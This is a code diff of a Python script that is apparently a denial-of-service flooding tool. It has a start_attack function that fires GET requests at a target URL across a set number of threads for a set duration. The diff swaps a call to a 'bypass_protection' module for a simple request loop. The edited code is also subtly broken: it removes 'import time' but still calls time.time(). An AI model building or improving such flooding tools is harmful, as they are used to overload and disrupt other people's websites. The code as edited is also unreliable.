@@ -1,11 +1,11 @@
 import random
-import time
 import requests
+from time import sleep
+import re
 from rich.console import Console
 import pyfiglet
-import re
-from concurrent.futures import ThreadPoolExecutor
-import bypass_protection  # Importing the bypass protection module
+
+console = Console()
 
 # Function to validate URL
 def is_valid_url(url: str) -> bool:
@@ -37,7 +37,7 @@ def analyze_status_code(status_code: int) -> str:
 # Function to simulate delay between requests
 def simulate_delay():
     delay = random.uniform(0.1, 0.5)  # Random delay between 0.1 to 0.5 seconds
-    time.sleep(delay)
+    sleep(delay)
 
 console = Console()
 
@@ -102,9 +102,9 @@ def send_get_request(url):
 def start_attack(url, threads, time_duration):
     start_time = time.time()  # Start the timer for attack duration
     console.print("[bold green]Attack Started Successfully![/bold green]")
-    
-    # Call the bypass protection function to handle protection bypass
-    bypass_protection.send_sophisticated_request(url, int(threads), int(time_duration))
+
+    for _ in range(int(threads)):
+        send_get_request(url)
 
     end_time = time.time()  # End the timer
     elapsed_time = end_time - start_time
